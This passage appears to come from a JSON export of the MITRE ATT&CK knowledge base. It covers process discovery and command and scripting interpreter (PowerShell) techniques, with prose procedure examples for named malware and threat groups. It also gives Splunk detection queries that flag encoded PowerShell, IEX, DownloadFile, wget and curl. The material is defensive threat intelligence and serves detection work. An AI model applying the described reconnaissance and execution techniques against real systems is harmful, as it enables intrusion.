      "Carboncan list the processes on the victim’s machine.[60]",
      "Cardinal RATcontains watchdog functionality that ensures its process is always running, else spawns a new instance.[61]",
      "Caterpillar WebShellcan gather a list of processes running on the machine.[62]",
      "CharmPowerhas the ability to list running processes through the use oftasklist.[63]",
      "ChChescollects its process identifier (PID) on the victim.[64]",
      "Chimerahas usedtasklistto enumerate processes.[65]",
      "CHIMNEYSWEEPcan check if a process name contains \"creensaver.\"[66]",
      "Clamblingcan enumerate processes on a targeted system.[67]",
      "Clopcan enumerate all processes on the victim's machine.[68]",
      "COATHANGERwill query running process information to determine subsequent program execution flow.[69]",
      "Cobalt Strike's Beacon payload can collect information on process details.[70][71][72]",
      "Comnieuses thetasklistto view running processes on the victim’s machine.[73]",
      "Contican enumerate through all open processes to search for any that have the string \"sql\" in their process name.[74]",
      "Crimsoncontains a command to list processes.[75][76][77]",
      "Cubacan enumerate processes running on a victim's machine.[78]",
      "Cuckoo Stealercan useps auxto enumerate running processes.[79]",
      "Cyclops Blinkcan enumerate the process it is currently running under.[80]",
      "Daclscan collect data on running and parent processes.[81]",
      "DarkCometcan list active processes running on the victim’s machine.[82]",
      "DarkGateperforms various checks for running processes, including security software by looking for hard-coded process name values.[83][84]",
      "Darkhotelmalware can collect a list of running processes on a system.[85]",
      "DarkTortillacan enumerate a list of running processes on a compromised system.[86]",
      "Deep Pandauses the MicrosoftTasklistutility to list processes running on systems.[87]",
      "Derusbicollects current and parent process IDs.[88][89]",
      "Diavolhas usedCreateToolhelp32Snapshot,Process32First, andProcess32NextAPI calls to enumerate the running processes in the system.[90]",
      "Dokihas searched for the current process’s PID.[91]",
      "Donutincludes subprojects that enumerate and identify information aboutProcess Injectioncandidates.[92]",
      "down_newhas the ability to list running processes on a compromised host.[23]",
      "DRATzaruscan enumerate and examine running processes to determine if a debugger is present.[93]",
      "Dtrack’s dropper can list all running processes.[94][95]",
      "The discovery modules used withDuqucan collect information on process details.[96]",
      "DUSTTRAPcan enumerate running processes.[97]",
      "DustySkycollects information about running processes from victims.[98][99]",
      "Earth Luscahas usedTasklistto obtain information from a compromised host.[100]",
      "EKANSlooks for processes from a hard-coded list.[101][102][103]",
      "Eliseenumerates processes via thetasklistcommand.[104]",
      "ELMERis capable of performing process listings.[105]",
      "Emotethas been observed enumerating local processes.[106]",
      "Empirecan find information about processes running on local and remote systems.[107][108]",
      "Epicuses thetasklist /vcommand to obtain a list of processes.[109][110]",
      "EvilBunnyhas used EnumProcesses() to identify how many process are running in the environment.[111]",
      "FatDukecan list running processes on the localhost.[112]",
      "FELIXROOTcollects a list of running processes.[113]",
      "Final1stspyobtains a list of running processes.[114]",
      "FinFisherchecks its parent process for indications that it is running in a sandbox setup.[115][116]",
      "Flagprohas been used to run thetasklistcommand on a compromised system.[117]",
      "FoggyWeb's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server'sMicrosoft.IdentityServer.ServiceHost.exeprocess.[118]",
      "FrameworkPOScan enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.[119]",
      "DuringFrankenstein, the threat actors usedEmpireto obtain a list of all running processes.[108]",
      "FruitFlyhas the ability to list processes on the system.[120]",
      "FunnyDreamhas the ability to discover processes, includingBka.exeandBkavUtil.exe.[121]",
      "DuringFunnyDream, the threat actors usedTaskliston targeted systems.[121]",
      "Fysbiscan collect information about running processes.[122]",
      "Gamaredon Grouphas used tools to enumerate processes on target hosts including Process Explorer.[123][124]",
      "Gelsemiumcan enumerate running processes.[125]",
      "GeminiDukecollects information on running processes and environment variables from the victim.[126]",
      "Get2has the ability to identify running processes on an infected host.[127]",
      "gh0st RAThas the capability to list processes.[128]",
      "Gold Dragonchecks the running processes on the victim’s machine.[48]",
      "Goopyhas checked for the Google Updater process to ensureGoopywas loaded properly.[129]",
      "Grandoreirocan identify installed security tools based on process names.[130]",
      "GravityRATlists the running processes on the system.[131]",
      "HAFNIUMhas usedtasklistto enumerate processes.[132]",
      "HALFBAKEDcan obtain information about running processes on the victim.[133]",
      "HELLOKITTYcan search for specific processes to terminate.[134]",
      "Helminthhas usedTasklistto get information on processes.[13]",
      "HEXANEhas enumerated processes on targeted systems.[135]",
      "Heyoka Backdoorcan gather process information.[136]",
      "Higaisa’s shellcode attempted to find the process ID of the current process.[137]",
      "HotCroissanthas the ability to list running processes on the infected host.[138]",
      "Hydraqcreates a backdoor through which remote attackers can monitor processes.[139][140]",
      "iKittenlists the current processes running.[120]",
      "Imminent Monitorhas a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed.[141]",
      "INC Ransomwarecan use the Microsoft Win32 Restart Manager to kill processes with a specific handle or that are accessing resources it wants to encrypt.[142]",
      "Inceptionhas used a reconnaissance module to identify active processes and other associated loaded modules.[143]",
      "Industroyer2has the ability to cyclically enumerate running processes such as PServiceControl.exe, PService_PDD.exe, and other targets supplied through a hardcoded configuration.[144]",
      "InvisiMolecan obtain a list of running processes.[145][146]",
      "IPsec Helpercan identify the process it is currently running under and its number, and pass this back to a command and control node.[10]",
      "IronNetInjectorcan identify processes via C# methods such asGetProcessesByNameand runningTasklistwith the Pythonos.popenfunction.[147]",
      "Ixeshecan list running processes.[148]",
      "Javalican monitor processes for open browsers and custom banking applications.[149]",
      "JHUHUGITobtains a list of running processes on the victim.[150][151]",
      "JPINcan list running processes.[152]",
      "jRATcan query and kill system processes.[153]",
      "Kasidethas the ability to search for a given process name in processes currently running in the system.[154]",
      "Kazuarobtains a list of running processes through WMI querying and thepscommand.[155]",
      "Ke3changperforms process discovery usingtasklistcommands.[156][157]",
      "KEYMARBLEcan obtain a list of running processes on the system.[158]",
      "KillDiskhas calledGetCurrentProcess.[159]",
      "Kimsukycan gather a list of all processes running on a victim's machine.[160]",
      "Kinsinghas used ps to list processes.[161]",
      "The OsInfo function inKomplexcollects a running process list.[162]",
      "KONNIhas used the commandcmd /c tasklistto get a snapshot of the current processes on the target machine.[163][164]",
      "KOPILUWAKcan enumerate current running processes on the targeted machine.[165]",
      "Scripts associated withKV Botnet Activityinitial deployment can identify processes related to security tools and other botnet families for follow-on disabling during installation.[166]",
      "Kwampirscollects a list of running services with the commandtasklist /v.[167]",
      "Latrodectuscan enumerate running processes including process grandchildren on targeted hosts.[168][169][170]",
      "SeveralLazarus Groupmalware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used byLazarus Groupalso gathers process times.[171][172][173][174][81][175]",
      "If sent the command16002,LightSpyuses theNSWorkspace runningApplications()method to collect the process ID, path to the executable, bundle information, and the filename of the executable for all running applications.[176]",
      "Linfocreates a backdoor through which remote attackers can retrieve a list of running processes.[177]",
      "Lizarhas a plugin designed to obtain a list of processes.[178][179]",
      "LockBit 2.0can determine if a running process has administrative privileges and terminate processes that interfere with encryption or exfiltration.[180][181]",
      "LockBit 3.0can identify and terminate specific services.[182][183]",
      "LookBackcan list running processes.[184]",
      "LoudMinerused thepscommand to monitor the running processes on the system.[185]",
      "Lucifercan identify the process that owns remote connections.[186]",
      "LunarWebhas used shell commands to list running processes.[187]",
      "Machetehas a component to check for running processes to look for web browsers.[188]",
      "MacMacan enumerate running processes.[189]",
      "macOS.OSAMinerhas usedps ax | grep <name> | grep -v grep | ...andps ax | grep -E...to conduct process discovery.[190]",
      "Mafaldacan enumerate running processes on a machine.[191]",
      "Magic Houndmalware can list running processes.[192]",
      "MarkiRATcan search for different processes on a system.[193]",
      "Mazehas gathered all of the running system processes.[194]",
      "Megazordcan terminate a list of specified services and processes.[195]",
      "metaMaincan enumerate the processes that run on the platform.[191][196]",
      "Metamorfohas performed process name checks and has monitored applications.[197]",
      "Meteorcan check if a specific process is running, such as Kaspersky'savp.exe.[198]",
      "MgBotincludes a module for establishing a process watchdog for itself, identifying if theMgBotprocess is still running.[199]",
      "Mispaducan enumerate the running processes on a compromised host.[200]",
      "MobileOrderhas a command to upload information about all running processes to its C2 server.[201]",
      "Moleratsactors obtained a list of active processes on the victim and sent them to C2 servers.[98]",
      "MoonWindhas a command to return a list of running processes.[202]",
      "Mosquitorunstasklistto obtain running processes.[203]",
      "MuddyWaterhas used malware to obtain a list of running processes on the system.[204][205]",
      "Mustang Pandahas usedtasklist /vto determine active process information.[206]",
      "NavRATusestasklist /vto check running processes.[207]",
      "Nebulaecan enumerate processes on a target system.[208]",
      "NETEAGLEcan send process listings over the C2 channel.[32]",
      "NETWIREcan discover processes on compromised hosts.[209]",
      "NightClubhas the ability to useGetWindowThreadProcessIdto identify the process behind a specified window.[210]",
      "Nightdoorcan collect information on installed applications via Windows registry keys, as well as collecting information on running processes.[211]",
      "Ninjacan enumerate processes on a targeted host.[212][213]",
      "njRATcan search a list of running processes for Tr.exe.[214]",
      "NKAbusewill check victim systems to ensure only one copy of the malware is running.[215]",
      "ObliqueRATcan check for blocklisted process names on a compromised host.[216]",
      "OceanSaltcan collect the name and ID for every process running on the system.[217]",
      "OilRighas runtaskliston a victim's machine and used infostealers to capture processes.[218][219]",
      "DuringOperation CuckooBees, the threat actors used thetasklistcommand as part of their advanced reconnaissance.[220]",
      "DuringOperation Honeybee, the threat actors obtained a list of running processes on a victim machine usingcmd /c tasklist > %temp%\\temp.ini.[221]",
      "DuringOperation Wocao, the threat actors usedtasklistto collect a list of running processes on an infected system.[222]",
      "Orzcan gather a process list from the victim.[223]",
      "OutSteelcan identify running processes on a compromised host.[224]",
      "P8RATcan check for specific processes associated with virtual environments.[225]",
      "Pandoracan monitor processes on a compromised host.[226]",
      "Pasamcreates a backdoor through which remote attackers can retrieve lists of running processes.[227]",
      "PcSharecan obtain a list of running processes on a compromised host.[121]",
      "Pillowmintcan iterate through running processes every six seconds collecting a list of processes to capture from later.[228]",
      "PipeMoncan iterate over the running processes to find a suitable injection target.[229]",
      "PLAINTEEperforms thetasklistcommand to list running processes.[230]",
      "Playhas used the information stealer Grixba to check for a list of security processes.[231]",
      "PLEADhas the ability to list processes on the compromised host.[232]",
      "PlugXhas a module to list the processes running on a machine.[233]",
      "PoetRAThas the ability to list all running processes.[234]",
      "POORAIMcan enumerate processes.[235]",
      "After compromising a victim,Poseidon Grouplists all running processes.[236]",
      "PowerDukehas a command to list the victim's processes.[237]",
      "PowerShowerhas the ability to deploy a reconnaissance module to retrieve a list of the active processes.[238]",
      "PowerSploit'sGet-ProcessTokenPrivilegePrivesc-PowerUp module can enumerate privileges for a given process.[239][240]",
      "PowerStallionhas been used to monitor process lists.[241]",
      "POWERSTATShas usedget_tasklistto discover processes on the compromised host.[242]",
      "POWRUNERmay collect process information by runningtaskliston a victim.[243]",
      "Proxysvclists processes running on the system.[174]",
      "Pupycan list the running processes and get the process ID and parent process’s ID.[244]",
      "QakBothas the ability to check running processes.[245]",
      "RainyDaycan enumerate processes on a target system.[208]",
      "Ramsaycan gather a list of running processes by usingTasklist.[246]",
      "RansomHubcan stop processes associated with files currently in use to maximize the impact of encryption.[247]",
      "Raspberry Robincan identify processes running on the victim machine, such as security software, during execution.[248][249]",
      "RATANKBAlists the system’s processes.[250][251]",
      "RCSessioncan identify processes based on PID.[252]",
      "Remseccan obtain a process list from the victim.[253]",
      "Rising Suncan enumerate all running processes and process information on an infected machine.[254]",
      "Rockecan detect a running process's PID on the infected machine.[255]",
      "RogueRobinchecks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.[256]",
      "ROKRATcan list the current running processes on the system.[257][258]",
      "RotaJakirocan monitor the/proc/[PID]directory of knownRotaJakiroprocesses as a part of its persistence when executing with non-root permissions. If the process is found dead, it resurrects the process.RotaJakiroprocesses can be matched to an associated Advisory Lock, in the/proc/locksfolder, to ensure it doesn't spawn more than one process.[259]",
      "Royalcan useGetCurrentProcessto enumerate processes.[260]",
      "RTMcan obtain information about process integrity levels.[261]",
      "Ryukhas calledCreateToolhelp32Snapshotto enumerate all running processes.[262]",
      "Sagerunexidentifies theexplorer.exeprocess on the executing system.[263]",
      "Saint Bothas enumerated running processes on a compromised host to determine if it is running under the process namedfrgui.exe.[224]",
      "Sardonichas the ability to execute thetasklistcommand.[264]",
      "SDBbotcan enumerate a list of running processes on a compromised machine.[265]",
      "Seasalthas a command to perform a process listing.[38]",
      "ShadowPadhas collected the PID of a malicious process.[266]",
      "ShimRatReporterlisted all running processes on the machine.[267]",
      "SHOTPUThas a command to obtain a process listing.[268]",
      "ShrinkLockerchecks whether the Bitlocker Drive Encryption Tools service is running.[269]",
      "Sidewinderhas used tools to identify running processes on the victim's machine.[270]",
      "SILENTTRINITYcan enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.[271]",
      "Skidmaphas monitored critical processes to ensure resiliency.[272]",
      "SLOTHFULMEDIAhas enumerated processes by ID, name, or privileges.[273]",
      "SocGholishcan list processes on targeted hosts.[274]",
      "Socksbotcan list all running processes.[275]",
      "SodaMastercan search a list of running processes.[225]",
      "During theSolarWinds Compromise,APT29used multiple command-line utilities to enumerate running processes.[276][277][278]",
      "SombRATcan use thegetprocesslistcommand to enumerate processes on a compromised host.[279][134][280]",
      "SoreFangcan enumerate processes on a victim machine through use ofTasklist.[281]",
      "Stealth Falconmalware gathers a list of running processes.[282]",
      "StreamExhas the ability to enumerate processes.[283]",
      "StrongPitycan determine if a user is logged in by checking to see if explorer.exe is running.[284]",
      "SUNBURSTcollected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.[285]",
      "SUNSPOTmonitored running processes for instances ofMsBuild.exeby hashing the name of each running process and comparing it to the corresponding value0x53D525. It also extracted command-line arguments and individual arguments from the runningMsBuild.exeprocess to identify the directory path of the Orion software Visual Studio solution.[286]",
      "SVCReadycan collect a list of running processes from an infected host.[287]",
      "Sykipotmay gather a list of running processes by runningtasklist /v.[288]",
      "SynAckenumerates all running processes.[289][290]",
      "SYSCONhas the ability to useTasklistto list running processes.[291]",
      "SysUpdatecan collect information about running processes.[292]",
      "Taidoorcan useGetCurrentProcessIdfor process discovery.[293]",
      "TAINTEDSCRIBEcan executeProcessListfor process discovery.[294]",
      "TajMahalhas the ability to identify running processes and associated plugins on an infected host.[295]",
      "Tasklistcan be used to discover processes running on a system.[296]",
      "TeamTNThas searched for rival malware and removes it if found.[297]TeamTNThas also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.[298]",
      "ThiefQuestobtains a list of running processes using the functionkill_unwanted.[299]",
      "ToddyCathas runcmd /c start /b tasklistto enumerate processes.[213]",
      "TrickBotuses module networkDll for process list discovery.[300][301]",
      "Trojan.Karaganycan useTasklistto collect a list of running tasks.[31][302]",
      "Tropic Trooperis capable of enumerating the running processes on the system usingpslist.[303][304]",
      "TSCookiehas the ability to list processes on the infected host.[305]",
      "Turlasurveys a system upon check-in to discover running processes using thetasklist /vcommand.[109]TurlaRPC backdoors have also enumerated processes associated with specific open ports or named pipes.[241]",
      "UBoatRATcan list running processes on the system.[306]",
      "UPSTYLEhas the ability to read/proc/self/cmdlineto see if it is running as a monitored process.[307]",
      "Uroburoscan use itsProcess Listcommand to enumerate processes on compromised hosts.[308]",
      "Ursnifhas gathered information about running processes.[309][310]",
      "USBferrycan usetasklistto gather information about the process running on the infected system.[304]",
      "Valakhas the ability to enumerate running processes on a compromised host.[311]",
      "VERMINcan get a list of the processes and running tasks on the system.[312]",
      "Volgmercan gather a list of processes.[313]",
      "Volt Typhoonhas enumerated running processes on targeted systems including through the use ofTasklist.[314][315][316]",
      "WarzoneRATcan obtain a list of processes on a compromised host.[317]",
      "Waterbearcan identify the process for a specific security product.[318]",
      "Windshifthas used malware to enumerate active processes.[319]",
      "WINERACKcan enumerate processes.[235]",
      "WinMMsets a WH_CBT Windows hook to collect information on process creation.[320]",
      "Winnti for Windowscan check if the explorer.exe process is responsible for calling its install function.[321]",
      "Winnti Grouplooked for a specific process running on infected servers.[322]",
      "Woody RATcan callNtQuerySystemProcessInformationwithSystemProcessInformationto enumerate all running processes, including associated information such as PID, parent PID, image name, and owner.[323]",
      "XAgentOSXcontains the getProcessList function to runps auxto get running processes.[324]",
      "ytygets an output of running processes using thetasklistcommand.[325]",
      "Zebrocyuses thetasklistandwmic process get Capture, ExecutablePathcommands to gather the processes running on the system.[56][326][57][327][328]",
      "Zeus Pandachecks for running processes on the victim’s machine.[329]",
      "ZIPLINEcan identify running processes and their names.[330]",
      "Zoxhas the ability to list processes.[331]",
      "ZxShellhas a command, ps, to obtain a listing of processes on the system.[332]",
      "ZxxZhas created a snapshot of running processes usingCreateToolhelp32Snapshot.[333]"
    ]
  },
  "T1059": {
    "Name": "Command and Scripting Interpreter",
    "Description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor ofUnix Shellwhile Windows installations include theWindows Command ShellandPowerShell.There are also cross-platform interpreters such asPython, as well as those commonly associated with client applications such asJavaScriptandVisual Basic.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded inInitial Accesspayloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize variousRemote Servicesin order to achieve remote Execution.[1][2][3]",
    "Detects": [
      "Monitor command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used.Analytic 1 - Suspicious script execution(sourcetype=WinEventLog:Security OR OR sourcetype=sysmon OR sourcetype=linux_secure OR sourcetype=linux_audit OR sourcetype=mac_os_log OR sourcetype=azure:audit OR sourcetype=o365:audit)| search Image IN (\"bash\", \"sh\", \"cmd\", \"powershell\", \"python\", \"java\", \"perl\", \"ruby\", \"node\", \"osascript\", \"wmic\")| eval suspicious_cmds=if(like(command_line, \"%Invoke-Obfuscation%\") OR like(command_line, \"%-EncodedCommand%\") OR like(command_line, \"%IEX%\") OR like(command_line, \"%wget%\") OR like(command_line, \"%curl%\"), \"Yes\", \"No\")",
      "Monitor for events associated with scripting execution, such as the loading of modules associated with scripting languages (ex: JScript.dll or vbscript.dll).Analytic 1 - Look for unusual module loads associated with scripting languages.sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational| search EventCode=7 ImageLoaded IN (\"C:\\Windows\\System32\\JScript.dll\", \"C:\\Windows\\System32\\vbscript.dll\", \"System.Management.Automation.dll\")",
      "Monitor log files for process execution through command-line and scripting activities. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.Analytic 1 - Look for unusual command and scripting process creation.(sourcetype=WinEventLog:Security OR sourcetype=sysmon OR sourcetype=linux_secure OR sourcetype=linux_audit OR sourcetype=mac_os_log OR sourcetype=azure:audit OR sourcetype=o365:audit)(EventCode=4688 OR EventID=1 OR _raw=shOR _raw=pythonOR _raw=powershellOR _raw=cmdOR _raw=scriptOR _raw=wscriptOR _raw=bash)",
      "Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner, or other information that may reveal abuse of system features. For example, consider monitoring for Windows Event ID (EID) 400, which shows the version of PowerShell executing in theEngineVersionfield (which may also be relevant to detecting a potentialDowngrade Attack) as well as if PowerShell is running locally or remotely in theHostNamefield. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.[59]",
      "Monitor for any attempts to enable scripts running on a system that would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Analytic 1 - Look for attempts to enable scripts on the system.index=windows (EventCode=1 OR EventCode=4688 OR EventCode=4103 OR EventCode=4104) (CommandLine=\"script\")| search script_name IN (\".ps1\", \".sh\", \".py\", \".rb\", \".js\", \".vbs\")| eval suspicious_script=if(like(script_name, \"%.sh\") AND hour(_time) NOT BETWEEN 8 AND 18, \"Yes\", \"No\")| where suspicious_script=\"Yes\""
    ],
    "Procedure Examples": [
      "APT19downloaded and launched code within a SCT file.[4]",
      "APT32has used COM scriptlets to download Cobalt Strike beacons.[5]",
      "APT37has used Ruby scripts to execute payloads.[6]",
      "APT39has utilized custom scripts to perform internal reconnaissance.[7][8]",
      "ArcaneDoorincluded the adversary executing command line interface (CLI) commands.[9]",
      "Bandookcan support commands to execute Java-based payloads.[10]",
      "Bonadancan create bind and reverse shells on the infected system.[11]",
      "CHOPSTICKis capable of performing remote command execution.[12][13]",
      "DuringCutting Edge, threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data.[14][15]",
      "DarkCometcan execute various types of scripts on the victim’s machine.[16]",
      "Donutcan generate shellcode outputs that execute via Ruby.[17]",
      "Dragonflyhas used the command line for execution.[18]",
      "Empireuses a command-line interface to interact with systems.[19]",
      "FIN5scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[20]",
      "FIN6has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[21][22]",
      "FIN7used SQL scripts to help perform tasks on the victim's machine.[23][24][23]",
      "FIVEHANDScan receive a command line argument to limit file encryption to specified directories.[25][26]",
      "FLORAHOX Activityhas executed PHP and Shell scripts to identify and infect subsequent routers for the ORB network.[27]",
      "Fox Kittenhas used a Perl reverse shell to communicate with C2.[28]",
      "Get2has the ability to run executables with command-line arguments.[29]",
      "gh0st RATis able to open a remote shell to execute commands.[30][31]",
      "Imminent Monitorhas a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.[32]",
      "Malware used byKe3changcan run commands on the command-line interface.[33][34]",
      "Kesselcan create a reverse shell between the infected host and a specified system.[11]",
      "Matryoshkais capable of providing Meterpreter shell access.[35]",
      "NICECURLhas provided an arbitrary command execution interface.[36]",
      "OilRighas used various types of scripting for execution.[37][38][39][40][41]",
      "ForOperation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.[42]",
      "P.A.S. Webshellhas the ability to create reverse shells with Perl scripts.[43]",
      "Raspberry Robinvariants can be delivered via highly obfuscated Windows Script Files (WSF) for initial execution.[44]",
      "Saint Bearhas used the Windows Script Host (wscript) to execute intermediate files written to victim machines.[45]",
      "SLIGHTPULSEcontains functionality to execute arbitrary commands passed to it.[46]",
      "SpeakUpuses Perl scripts.[47]",
      "Stealth Falconmalware uses WMI to script data collection and command execution on the victim.[48]",
      "VersaMemwas delivered as a Java Archive (JAR) that runs by attaching itself to the Apache Tomcat Java servlet and web server.[49]",
      "Whiteflyhas used a simple remote shell tool that will call back to the C2 server and wait for commands.[50]",
      "Windigohas used a Perl script for information gathering.[11]",
      "WINERACKcan create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.[51]",
      "Winter Vivernused XLM 4.0 macros for initial code execution for malicious document files.[52]",
      "ZeroClearecan receive command line arguments from an operator to corrupt the file system using theRawDiskdriver.[53]",
      "Zeus Pandacan launch remote scripts on the victim’s machine.[54]"
    ]
  },
  "T1059.001": {
    "Name": "Command and Scripting Interpreter:PowerShell",
    "Description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.[1]Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include theStart-Processcmdlet which can be used to run an executable and theInvoke-Commandcmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, includingEmpire,PowerSploit,PoshC2, and PSAttack.[2]PowerShell commands/scripts can also be executed without directly invoking thepowershell.exebinary through interfaces to PowerShell's underlyingSystem.Management.Automationassembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).[3][4][5]",
    "Detects": [
      "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity. It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations).[321]PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[322]An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.PowerShell can be used over WinRM to remotely run commands on a host. When a remote PowerShell session starts, svchost.exe executes wsmprovhost.exeFor this to work, certain registry keys must be set, and the WinRM service must be enabled. The PowerShell command Enter-PSSession -ComputerName \\<RemoteHost> creates a remote PowerShell session.Analytic 1 - Look for unusual PowerShell execution.sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational| search EventCode=4104| eval suspicious_cmds=if(like(Message, \"%-EncodedCommand%\") OR like(Message, \"%Invoke-Expression%\") OR like(Message, \"%IEX%\") OR like(Message, \"%DownloadFile%\"), \"Yes\", \"No\")| where suspicious_cmds=\"Yes\"",
      "Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).[3][4]Analytic 1 - Processes loading PowerShell assembliessourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational| search EventCode=7 ImageLoaded IN (\"C:\\Windows\\System32\\System.Management.Automation.dll\", \"C:\\Windows\\System32\\powershell.exe\")",
      "Monitor for newly executed processes that may abuse PowerShell commands and scripts for execution. PowerShell is a scripting environment included with Windows that is used by both attackers and administrators. Execution of PowerShell scripts in most Windows versions is opaque and not typically secured by antivirus which makes using PowerShell an easy way to circumvent security measures. This analytic detects execution of PowerShell scripts.Powershell can be used to hide monitored command line execution such as:net usesc startNote: - The logic for Analytic 1 is based around detecting on non-interactive Powershell sessions (i.e., those not launched by a user through explorer.exe). This may lead to false positives when used in a production environment, so we recommend tuning any such analytics by including additional logic (e.g., looking for suspicious parent processes) that helps filter such events.- The logic for Analytic 2 is based around detecting on remote Powershell sessions. PowerShell can be used over WinRM to remotely run commands on a host. When a remote PowerShell session starts, svchost.exe executes wsmprovhost.exe.Analytic 1 - Non-interactive Powershell Sessions(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"powershell.exe\" AND ParentImage!=\"explorer.exe\"Analytic 2 - Remote Powershell Sessions(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"wsmprovhost.exe\" AND ParentImage=\"svchost.exe\"Analytic 3 - Powershell Execution(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") Image=\"C:\\Windows\\\\powershell.exe\" ParentImage!=\"C:\\Windows\\explorer.exe\"|stats values(CommandLine) as \"Command Lines\" values(ParentImage) as \"Parent Images\" by ComputerName",
      "Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in theEngineVersionfield (which may also be relevant to detecting a potentialDowngrade Attack) as well as if PowerShell is running locally or remotely in theHostNamefield. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.[323]",
      "Monitor for any attempts to enable scripts running on a system that would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Analytic 1 - Script Block Logging Events(source=WinEventLog:\"Microsoft-Windows-PowerShell/Operational\" EventID=\"4104\" AND Image=\"powershell.exe\" AND (CommandLine=\"-enc\" OR CommandLine=\"-ep bypass\" OR CommandLine=\"-noni*\")"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[6]",
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamutilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.[7]",
      "AADInternalsis written and executed via PowerShell.[8]",
      "Akirawill execute PowerShell commands to delete system volume shadow copies.[9][10]",
      "Akirahas used PowerShell scripts for credential harvesting and privilege escalation.[11]",
      "AppleSeedhas the ability to execute its payload via PowerShell.[12]",
      "APT19used PowerShell commands to execute payloads.[13]",
      "APT28downloads and executes PowerShell scripts and performs PowerShell commands.[14][15][16]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28used PowerShell cmdletGet-ChildItemto access credentials, among other PowerShell functions deployed.[17]",
      "APT29has used encoded PowerShell scripts uploaded toCozyCarinstallations to download and installSeaDuke.[18][19][20][21]",
      "APT3has used PowerShell on victim systems to download and run payloads after exploitation.[22]",
      "APT32has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.[23][24][25]",
      "APT33has utilized PowerShell to download files from the C2 server and run various scripts.[26][27]",
      "APT38has used PowerShell to execute commands and other operational tasks.[28]",
      "APT39has used PowerShell to execute malicious code.[29][30]",
      "APT41leveraged PowerShell to deploy malware families in victims’ environments.[31][32]",
      "APT42has downloaded and executed PowerShell payloads.[33]",
      "APT5has used PowerShell to accomplish tasks within targeted environments.[34]",
      "Aquatic Pandahas downloaded additional scripts and executed Base64 encoded commands in PowerShell.[35]",
      "AutoIt backdoordownloads a PowerShell script that decodes to a typical shellcode loader.[36]",
      "BADHATCHcan utilizepowershell.exeto execute commands on a compromised host.[37][38]",
      "Bandookhas used PowerShell loaders as part of execution.[39]",
      "Bazarcan execute a PowerShell script received from C2.[40][41]",
      "Black Bastahas used PowerShell scripts for discovery and to execute files over the network.[42][43][44]",
      "BlackByteused encoded PowerShell commands during operations.[45]BlackBytehas used remote PowerShell commands in victim networks.[46]",
      "BloodHoundcan use PowerShell to pull Active Directory information from the target environment.[47]",
      "Blue Mockingbirdhas used PowerShell reverse TCP shells to issue interactive commands over a network connection.[48]",
